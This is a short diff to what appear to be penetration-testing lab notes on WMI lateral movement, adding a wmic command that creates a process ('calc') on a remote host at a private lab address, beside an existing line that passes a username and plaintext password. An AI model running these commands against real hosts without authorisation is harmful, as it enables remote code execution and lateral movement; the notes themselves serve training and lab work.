@@ -18,6 +18,7 @@ It allows *Local Administrator* users to run tasks (including shells) as another
 Exploiting on CMD:
 ```
 wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+wmic /node:192.168.50.73 process call create "calc"
 ```
 
 Exploiting on Powershell:
